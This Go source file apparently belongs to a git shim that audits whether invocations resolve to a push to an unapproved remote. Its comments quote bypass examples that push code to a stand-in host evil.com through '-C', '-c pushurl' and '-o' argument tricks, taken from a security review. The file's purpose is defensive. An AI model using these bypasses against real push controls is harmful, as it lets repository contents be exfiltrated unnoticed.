package gitshim

import (
	"os/exec"
	"strings"
)

// globalOptsWithValue are top-level `git` options (before the subcommand)
// that consume the following argument as a separate token. Missing one of
// these lets its value be misread as the subcommand itself — e.g.
// `git -C /x push https://evil.com/x.git main` or
// `git -c remote.origin.pushurl=https://evil.com/x.git push origin main`
// would have had args[0] be "-C"/"-c" and passed straight through
// unaudited. Confirmed as a real bypass in the v0.1 security review (V1).
var globalOptsWithValue = map[string]bool{
	"-C": true, "-c": true,
	"--git-dir": true, "--work-tree": true, "--namespace": true,
	"--super-prefix": true, "--exec-path": true,
}

// pushOptsWithValue are `git push` flags that consume the following
// argument as a separate token. Missing one of these lets its value be
// misread as the push destination: `git push -o origin <evil-url>` would
// have read "origin" as the destination (resolving to the known-good
// remote and allowing the push) while the real destination — the evil URL
// — was silently forwarded as the actual push target. Confirmed as a real
// bypass in the v0.1 security review (V4).
var pushOptsWithValue = map[string]bool{
	"-o": true, "--push-option": true,
	"--receive-pack": true, "--exec": true, "--repo": true,
}

const maxAliasDepth = 3

// resolveInvocation walks past global `git` options and, up to a small
// depth, expands git aliases, to determine whether an invocation
// ultimately reaches `push` — without reimplementing git's full command
// grammar (that reimplementation risk is exactly why v0.1 only supports
// explicit `git push <remote|url>`, see ARCHITECTURE.md 0.6).
//
// It returns:
//   - isPush: whether the invocation resolves to a push
//   - pushArgs: the arguments following the resolved "push" token, for
//     resolveDestination to parse
//   - configArgs: every `-c key=value` pair seen along the way (through
//     global options and, in principle, an alias expansion), which must be
//     replayed against internal `git remote get-url` calls so they see the
//     same config the real push will — otherwise `-c` on the command line
//     can repoint a remote's pushurl for the real push while our
//     resolution call (built fresh, without that flag) sees the clean,
//     pre-session URL. Confirmed as a real bypass (V2).
//
// GIT_CONFIG_COUNT/KEY/VALUE environment-variable-based config injection
// is a "same family" vector the review flagged, but it does not need
// separate handling here: environment variables are inherited identically
// by our internal `git remote get-url` calls and by the real push (we
// never scrub or override env for those internal calls), so both sides
// see the same injected config and the baseline check still catches it.
// Command-line `-c` is the one vector that differs between the two calls,
// which is what this function closes.
func resolveInvocation(realGit string, args []string) (isPush bool, pushArgs, configArgs []string) {
	remaining := args
	for depth := 0; depth < maxAliasDepth; depth++ {
		i := 0
		for ; i < len(remaining); i++ {
			a := remaining[i]
			if a == "-c" {
				if i+1 < len(remaining) {
					configArgs = append(configArgs, "-c", remaining[i+1])
					i++
				}
				continue
			}
			if globalOptsWithValue[a] {
				i++ // skip its value token too
				continue
			}
			if strings.HasPrefix(a, "-") {
				continue
			}
			break
		}
		if i >= len(remaining) {
			return false, nil, configArgs
		}
		sub := remaining[i]
		rest := remaining[i+1:]

		if sub == "push" {
			return true, rest, configArgs
		}

		expansion, ok := lookupAlias(realGit, configArgs, sub)
		if !ok {
			return false, nil, configArgs
		}
		remaining = append(append([]string{}, expansion...), rest...)
	}
	// Alias chain too deep to resolve confidently — not push as far as we
	// could determine; real git will still run it via passthrough.
	return false, nil, configArgs
}

// lookupAlias resolves `git config --get alias.<name>`. It refuses to
// expand shell-command aliases (`alias.x = !...`) — those are an
// unbounded, pre-existing git trust question independent of Leash, and
// are left to passthrough like any other non-push subcommand (V5).
func lookupAlias(realGit string, configArgs []string, name string) ([]string, bool) {
	cmdArgs := append(append([]string{}, configArgs...), "config", "--get", "alias."+name)
	out, err := exec.Command(realGit, cmdArgs...).Output()
	if err != nil {
		return nil, false
	}
	val := strings.TrimSpace(string(out))
	if val == "" || strings.HasPrefix(val, "!") {
		return nil, false
	}
	return strings.Fields(val), true
}
